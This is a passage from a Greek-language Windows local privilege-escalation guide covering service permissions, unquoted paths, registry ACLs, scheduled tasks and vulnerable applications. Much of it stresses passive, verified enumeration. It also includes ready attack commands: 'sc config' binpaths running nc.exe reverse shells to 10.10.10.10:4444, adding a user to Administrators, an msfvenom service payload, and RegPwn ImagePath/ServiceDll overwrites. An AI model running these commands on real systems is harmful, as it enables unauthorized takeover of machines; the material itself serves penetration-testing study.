Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START επιτρέπει την παροχή ορισμάτων στο StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)· είναι διαφορετικό από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Ελέγξτε τον κώδικα ή την τεκμηριωμένη διεπαφή της υπηρεσίας προτού θεωρήσετε ότι το δικαίωμα εκκίνησης παρέχει κάτι πέρα από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο καλών ως διαδρομή καταγραφής ή εξαγωγής, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα προς την εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **δημιουργημένου αρχείου**. Μια εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο αν υπάρχει ξεχωριστός προνομιούχος consumer ή loader που αποδέχεται αυτό το αρχείο· ένα εγγράψιμο log ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική απογραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

Για έναν monitoring agent NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο ρυθμίσεων**: ενδέχεται να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη διαμόρφωση σε άλλη τοποθεσία. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον WEB listener και την πολιτική πρόσβασης, καθώς και το αν ο πιστοποιημένος ρόλος μπορεί να αλλάζει ρυθμίσεις ή scripts. Η προνομιούχα εκτέλεση απαιτεί επιπλέον το `CheckExternalScripts` (ή κάποια άλλη ενεργοποιημένη διαδρομή εκτέλεσης), αποτελεσματικό δικαίωμα καταχώρισης ή τροποποίησης μιας εντολής και ένα trigger που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener μόνο για loopback μπορεί και πάλι να είναι προσβάσιμος σε τοπικό χρήστη, αλλά η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener από μόνα τους δεν αποδεικνύουν ότι υπάρχουν αυτά τα δικαιώματα. Ελέγξτε τα μεταδεδομένα και τα δικαιώματα χωρίς να εμφανίζετε μυστικά ή να καλείτε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων του NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας για web και scripts](https://nsclient.org/docs/setup/securing/) και τη [διαμόρφωση external scripts](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [το NSSM αποθηκεύει εκεί την child application](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο διαμορφωμένος κατάλογος εργασίας της. Ελέγξτε το child εκτελέσιμο αρχείο και τα ACL του γονικού καταλόγου του, προτού θεωρήσετε ότι τα δικαιώματα του wrapper περιγράφουν πλήρως το όριο ασφαλείας της υπηρεσίας. Ένα τοπικό WCF ή SOAP endpoint που εκτίθεται από αυτό το child αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο χρήστης με χαμηλότερα δικαιώματα μπορεί να φτάσει στον listener, ότι η συγκεκριμένη λειτουργία δέχεται την είσοδό του και ότι το child της υπηρεσίας εκτελεί την μη ασφαλή λειτουργία με υψηλότερη ταυτότητα. Ο λογαριασμός υπηρεσίας, ένα URL endpoint ή μια εγγράψιμη διαδρομή από μόνα τους δεν αποδεικνύουν κλιμάκωση· αποφύγετε να καλείτε λειτουργίες υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, ανιχνεύστε μια συμβολοσειρά που ελέγχει ο καλών έως οποιοδήποτε PowerShell runspace. Η [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) και η [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding με διαπιστευτήρια μεταφοράς Windows`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) πιστοποιεί τον client, αλλά η εξουσιοδότηση για την κλήση της **συγκεκριμένης** λειτουργίας και η αποτελεσματική ταυτότητα του runspace πρέπει να ελεγχθούν ξεχωριστά. Μια διαδρομή από την είσοδο ενός καλούντος με χαμηλότερα δικαιώματα προς το `AddScript` υπό υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια θύρα που ακούει, ένας πιστοποιημένος client ή μια αχρησιμοποίητη μέθοδος σε άσχετο assembly από μόνα τους δεν αποτελούν απόδειξη. Ελέγξτε στατικά την αναπτυγμένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation χωρίς να καλείτε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις του Visual Studio με εργαλεία C/C++ ενδέχεται να περιλαμβάνουν το `VSStandardCollectorService150`, μια διαγνωστική υπηρεσία ρυθμισμένη να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε μια junction και μια συνθήκη ανταγωνισμού object-manager-link για να ανακατευθύνει την επαναφορά DACL της υπηρεσίας. Η επίδειξη κλιμάκωσης απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI μέσω του Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική αρχική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή του binary αυτής της υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση των patches του εγκατεστημένου στοιχείου. Μια εγγραφή υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι το σύστημα είναι ευάλωτο. Ο έλεγχος δεν χρειάζεται να εκκινήσει την υπηρεσία ή να εκτελέσει επιδιόρθωση.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία.

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από τη _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο προνομίων για κάθε service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν η ομάδα "Authenticated Users" μπορεί να τροποποιήσει οποιαδήποτε υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανιστεί αυτό το σφάλμα (για παράδειγμα, με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν υπάρχουν συσκευές που να σχετίζονται με αυτήν και να είναι ενεργοποιημένες._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα δικαιώματα μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση permissions, δίνοντας τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ownership και την αναδιαμόρφωση permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορείτε να χρησιμοποιήσετε το _exploit/windows/local/service_permissions_.

### Αδύναμα permissions στα binaries υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να γίνει hijack **αντικαθιστώντας το binary και επανεκκινώντας την υπηρεσία**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **write permissions στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να εντοπίσετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα permissions σας με το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACL που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά δικαιώματα **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή εκμετάλλευσης είναι:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το δυαδικό αρχείο είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το δυαδικό αρχείο της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο δυαδικό αρχείο υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε να γίνει επανεκκίνηση ή να ενεργοποιηθεί κάποιο trigger της υπηρεσίας).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά την εκκίνηση, αν έχει ρυθμισμένη ενέργεια αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης του μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **μητρώο** υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο κλειδί μητρώου μιας συγκεκριμένης υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι υπάρχει αποτελεσματική πρόσβαση: σημασία έχουν οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα κλειδιού μητρώου είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Για την κλιμάκωση απαιτούνται επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης υπηρεσίας, ένας τρόπος ενεργοποίησης της υπηρεσίας και μια ταυτότητα υπηρεσίας με περισσότερα προνόμια. Δείτε τα [δικαιώματα κλειδιού μητρώου](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε τη διαδρομή του εκτελέσιμου αρχείου:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race condition με symlink στο Registry για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Μια **race condition με symbolic link** στο Registry μπορεί να ανακατευθύνει αυτήν την εγγραφή με αυξημένα δικαιώματα σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας τη δυνατότητα για αυθαίρετη **εγγραφή τιμής** HKLM.<sup>[[18]](#references)</sup>

Βασικές θέσεις (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` περιέχει τη λίστα με τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχει ο χρήστης.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις ασφαλούς επιφάνειας εργασίας και είναι εγγράψιμο από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Ορίστε την τιμή **HKCU ATConfig** που θέλετε να εγγράψει η SYSTEM.
2. Ενεργοποιήστε την αντιγραφή της ασφαλούς επιφάνειας εργασίας (π.χ., με **LockWorkstation**), ώστε να ξεκινήσει η ροή του AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Η SYSTEM εγγράφει την τιμή που επέλεξε ο επιτιθέμενος στη διαδρομή HKLM στην οποία έγινε ανακατεύθυνση.

Μόλις αποκτήσετε δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, μεταβείτε σε LPE παρακάμπτοντας τις τιμές διαμόρφωσης υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο μητρώο των Services

Αν έχετε αυτό το δικαίωμα σε ένα κλειδί μητρώου, σημαίνει ότι **μπορείτε να δημιουργήσετε υποκλειδιά μέσα σε αυτό**. Στην περίπτωση των Windows services, αυτό **αρκεί για την εκτέλεση αυθαίρετου κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της διαδρομής που τελειώνει πριν από ένα κενό διάστημα.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Καταγράψτε όλες τις διαδρομές υπηρεσιών που δεν είναι μέσα σε εισαγωγικά, εξαιρώντας όσες ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν τις ενέργειες που θα εκτελούνται αν αποτύχει μια υπηρεσία. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η κλιμάκωση προνομίων. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Προορισμοί script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με ένα αρχείο `.bat` ή `.cmd`, ελέγξτε τόσο το script που αναφέρεται στα **ορίσματα ενέργειας** όσο και το `cmd.exe`. Το ίδιο ισχύει για το ρητό όρισμα αρχείου ενός interpreter, όπως το PowerShell `-File`. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε επίσης τα ACL του script στο οποίο παραπέμπει· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να κάνει εγγραφή ο καλών αποτελεί ένδειξη πιθανής εκτέλεσης μεταξύ λογαριασμών μόνο όταν το configured principal της εργασίας διαφέρει από τον καλούντα και η εργασία εκτελεί πράγματι αυτή την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη μπορεί να έχει σημασία για τα scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καθιστά τις γραμμές που προστέθηκαν μη προσβάσιμες. Επιβεβαιώστε τα πραγματικά ACL, το [πλαίσιο εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν ισχυριστείτε ότι υπάρχει κλιμάκωση. Η απογραφή δεν πρέπει να τροποποιεί το script ούτε να εκκινεί την εργασία.

## Ονομασμένες ροές σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει μια ονομασμένη ροή `:$DATA` της οποίας τα περιεχόμενα δεν εμφανίζονται σε μια συνηθισμένη λίστα καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων διαμόρφωσης, ελέγξτε τα **ονόματα και τα μεγέθη** των ροών πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows τις εκθέτουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), καθώς και μέσω της εντολής PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα ροής που υποδηλώνει μυστικό αποτελεί απλώς ένδειξη. Ελέγξτε την πραγματική πρόσβαση ανάγνωσης του αρχείου, αν το filesystem υποστηρίζει ροές, αν η ροή περιέχει αξιοποιήσιμα διαπιστευτήρια και με ποιον λογαριασμό γίνεται πράγματι η αυθεντικοποίηση. Αποφύγετε τις αναδρομικές σαρώσεις ροών και την εκτύπωση περιεχομένων ροών κατά τη συνήθη απογραφή.

## Είσοδοι βοηθητικού προγράμματος του Windows Driver Kit που εκτελείται μέσω προγραμματισμένης εργασίας

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και `working\rsf.rsf` ενός project από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το βοηθητικό πρόγραμμα με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών προνομίων σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο πλαίσιο αυτού του λογαριασμού, ακόμη κι όταν το ίδιο το εκτελέσιμο του βοηθητικού προγράμματος είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος καταναλωτής και ότι μπορούν να δημιουργηθούν ή να τροποποιηθούν **και** τα δύο συνοδευτικά αρχεία· η εύρεση του βοηθητικού προγράμματος από μόνη της δεν αρκεί.

Για μια προγραμματισμένη εργασία, ελέγξτε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν ορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου αποτελεί απλώς ένδειξη προς επαλήθευση, όχι απόδειξη για το πού διαβάζει η εργασία τα αρχεία εισόδου της. Πρέπει επίσης να πληρούται η προϋπόθεση του αρχείου εργασίας του project. Ελέγξτε το πραγματικό principal της εργασίας αντί να υποθέτετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κλιμακώσετε προνόμια) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης του Checkmk Windows agent

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Checkmk Windows agents, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, όταν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο που προστατευόταν από εγγραφή. Ο προμηθευτής διόρθωσε το ζήτημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες επίπεδο ενημέρωσης της εγκατεστημένης έκδοσης και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο για τον κλάδο, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα του Temp χωρίς να δημιουργεί αρχεία ή να ενεργοποιεί εντολές του agent.

#### Έλεγχος υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε την έκδοση 6210 και παλαιότερες του ADSelfService Plus· ο προμηθευτής το διόρθωσε στην έκδοση 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή η διαδρομή μιας υπηρεσίας αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ευπάθειας: επιβεβαιώστε την ακριβή έκδοση, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· για εκτέλεση ως SYSTEM απαιτείται η υπηρεσία να εκτελείται ως SYSTEM. Ένα αναγνώσιμο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος αποτελεί ξεχωριστή ένδειξη ύπαρξης κρυπτογραφημένου αντιγράφου ασφαλείας, όχι απόδειξη χρήσιμων διαπιστευτηρίων ή της συγκεκριμένης αδυναμίας SAML. Καταγράψτε τη διαδρομή του και τα δικαιώματα πρόσβασης χωρίς να το αποσυσκευάσετε κατά τη συνήθη απαρίθμηση.

#### Όρια Jenkins controller και λογαριασμών τομέα

